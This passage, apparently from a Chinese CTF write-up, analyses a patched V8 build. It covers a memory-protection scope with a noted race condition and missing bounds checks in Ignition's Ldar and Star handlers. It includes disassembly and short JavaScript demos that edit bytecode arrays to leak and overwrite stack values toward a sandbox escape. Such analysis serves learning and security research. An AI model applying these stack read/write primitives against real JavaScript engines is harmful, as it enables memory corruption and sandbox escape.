
## 方法实现

先创建了三个方法：

```c++
+RwMemoryWriteScope::RwMemoryWriteScope() {
+ SetWritable();
+}
+
+RwMemoryWriteScope::RwMemoryWriteScope(const char \*comment) {
+ SetWritable();
+}
+
+RwMemoryWriteScope::~RwMemoryWriteScope() {
+ SetReadOnly();
+}
+
```

下面在`RwMemoryWriteScope`命名空间下新增了三个方法，分别是`ProtectSpace`、`SetWritable`、`SetReadOnly`。

`ProtectSpace`的作用是将一段地址赋为指定的权限，核心是这里的`mprotect(addr, RoundDown(sizeof(MemoryChunk), 0x1000), prot)`，就是熟悉的权限修改。

`SetWritable`的作用是将当前的地址空间赋为`rw`权限，需要注意其处理：对于`young generation`且没有被`gc`处理过的内存空间，会将`from_space`和`to_space`的地址空间权限赋为`rw`；反之就是已经处理过的`old generaion`，直接调用`ProtectSpace`去赋权限。`SetReadOnly`的作用同理，结构和`SetWritable`是一样的。

这里其实就已经存在了一个条件竞争的问题，两个函数使用了`nesting_level`变量来约束，但是对于多线程的情况其实就会出现问题，但这个并不是预期解法。

```c++
+thread\_local int RwMemoryWriteScope::nesting\_level\_ = 0;
+
+static void ProtectSpace(Space \*space, int prot) {
+ if (space->memory\_chunk\_list().Empty()) {
+ return;
+ }
+
+ MemoryChunk \*c = space->memory\_chunk\_list().front();
+ while (c) {
+ void \*addr = reinterpret\_cast<void \*>(c->address());
+ // printf("making %p read-only\n", addr);
+ CHECK(mprotect(addr, RoundDown(sizeof(MemoryChunk), 0x1000), prot) == 0);
+ c = c->list\_node().next();
+ }
+}
+
+// static
+void RwMemoryWriteScope::SetWritable() {
+ if (nesting\_level\_ == 0) {
+ int prot = PROT\_READ | PROT\_WRITE;
+ Isolate \*isolate = Isolate::Current();
+ for (int i = FIRST\_MUTABLE\_SPACE; i < LAST\_SPACE; i++) {
+ Space \*space = isolate->heap()->space(i);
+ if (space == nullptr) {
+ continue;
+ }
+
+ if (!v8\_flags.minor\_mc && i == NEW\_SPACE) {
+ SemiSpaceNewSpace\* semi\_space\_new\_space = SemiSpaceNewSpace::From(static\_cast<NewSpace \*>(space));
+ ProtectSpace(&semi\_space\_new\_space->from\_space(), prot);
+ ProtectSpace(&semi\_space\_new\_space->to\_space(), prot);
+ } else {
+ ProtectSpace(space, prot);
+ }
+ }
+ }
+ nesting\_level\_++;
+}
+
+// static
+void RwMemoryWriteScope::SetReadOnly() {
+ nesting\_level\_--;
+ if (nesting\_level\_ == 0) {
+ int prot = PROT\_READ;
+ Isolate \*isolate = Isolate::Current();
+ for (int i = FIRST\_MUTABLE\_SPACE; i < LAST\_SPACE; i++) {
+ Space \*space = isolate->heap()->space(i);
+ if (space == nullptr) {
+ continue;
+ }
+
+ if (!v8\_flags.minor\_mc && i == NEW\_SPACE) {
+ SemiSpaceNewSpace\* semi\_space\_new\_space = SemiSpaceNewSpace::From(static\_cast<NewSpace \*>(space));
+ ProtectSpace(&semi\_space\_new\_space->from\_space(), prot);
+ ProtectSpace(&semi\_space\_new\_space->to\_space(), prot);
+ } else {
+ ProtectSpace(space, prot);
+ }
+ }
+ }
+}
+
```

## 漏洞分析

`Ignition`作为`v8`的字节码解释器，`JavaScripts`代码会被转化为字节码，然后字节码通过`Ignition`解释执行，所以即使`Maglev/Jit`关闭，也不会影响到`Ignition`。

`Ignition`会从字节码数组中读取指令执行，这些字节码通常是从源代码编译而来的，所以通过修改这些字节码数组的内容，可以实现指令的执行，但是要如何实现沙箱逃逸呢？

`v8`的`js`解释器定义了一些`opcode`，这些其中`Ldar`和`Star`出现了缺乏边界检查的问题，我们可以利用这两个实现沙箱逃逸。

### Ldar 指令

这里是`Ldar`指令对应的字节码：

```text
pwndbg> job 0x123e00195bbd
0x123e00195bbd: [BytecodeArray] in OldSpace
- map: 0x123e00000979 <Map(BYTECODE\_ARRAY\_TYPE)>
Parameter count 3
Register count 0
Frame size 0
0x123e00195bdc @ 0 : 0b 04 Ldar a1
0x123e00195bde @ 2 : 38 03 00 Add a0, [0]
0x123e00195be1 @ 5 : 44 01 01 AddSmi [1], [1]
0x123e00195be4 @ 8 : aa Return
Constant pool (size = 0)
Handler Table (size = 0)
Source Position Table (size = 0)
pwndbg>
```

下面是`Ldar`指令对应的汇编，`r12`寄存器是`bytecodearray`的基址，`r9`是索引。可以不难看出这里的返回值`rac`由`rbx`赋值，`rbx`是通过`rdx+rbx`索引得到，然后`rdx`由`rbp`赋值，也就是说这个指令会返回一个栈上的数值。

```text
pwndbg> disassemble Builtins\_LdarHandler
Dump of assembler code for function Builtins\_LdarHandler:
0x000061c54bbfb740 <+0>: movsx rbx,BYTE PTR [r12+r9\*1+0x1]
0x000061c54bbfb746 <+6>: mov rdx,rbp
0x000061c54bbfb749 <+9>: mov rbx,QWORD PTR [rdx+rbx\*8]
0x000061c54bbfb74d <+13>: add r9,0x2
0x000061c54bbfb751 <+17>: movzx edx,BYTE PTR [r9+r12\*1]
0x000061c54bbfb756 <+22>: mov rcx,QWORD PTR [r15+rdx\*8]
0x000061c54bbfb75a <+26>: mov rax,rbx
0x000061c54bbfb75d <+29>: jmp rcx
0x000061c54bbfb75f <+31>: nop
End of assembler dump.
pwndbg>
```

通过`demo`可以看下这个的效果：

```javascript
ResetOffset();
EditBytecodeArray(0xb);
EditBytecodeArray(0x10);
EditBytecodeArray(0xaa);
stop()
var leak = h();
logg("leak",leak);
```

此时的指令执行情况：

![](upload/attach/202505/971428\_TUMG5HSBCSF9N6H.png)

此时栈和`leak`的情况：

![](upload/attach/202505/971428\_H84833U4KN2JBJ2.png)

由于指针压缩的存在，只能泄漏出低`32`位的值，同时由于类型是`smi`，所以会对应的`>>1`，这里`0x000000000fdb6c0e * 2 = 0x1fb6d81c`。

### Star 指令

下面是`Star`的汇编指令，与`Ldar`同理。这里将`rax`，也就是上一次执行的返回值，赋给栈上。

```text
pwndbg> disassemble Builtins\_StarHandler
Dump of assembler code for function Builtins\_StarHandler:
0x000056c61fcb4d00 <+0>: movsx ebx,BYTE PTR [r12+r9\*1+0x1]
0x000056c61fcb4d06 <+6>: mov rdx,rbp
0x000056c61fcb4d09 <+9>: movsxd rbx,ebx
0x000056c61fcb4d0c <+12>: mov QWORD PTR [rdx+rbx\*8],rax
0x000056c61fcb4d10 <+16>: add r9,0x2
0x000056c61fcb4d14 <+20>: movzx ebx,BYTE PTR [r9+r12\*1]
0x000056c61fcb4d19 <+25>: mov rcx,QWORD PTR [r15+rbx\*8]
0x000056c61fcb4d1d <+29>: jmp rcx
0x000056c61fcb4d1f <+31>: nop
End of assembler dump.
```

执行了这一段代码：

```javascript
ResetOffset();
EditBytecodeArray(0xb);
EditBytecodeArray(0x10);
EditBytecodeArray(0x18);
EditBytecodeArray(0x0);
EditBytecodeArray(0xaa);
```

不难从下面看出，`rbp+0x0`处的值被修改为`rax`寄存器内的值。
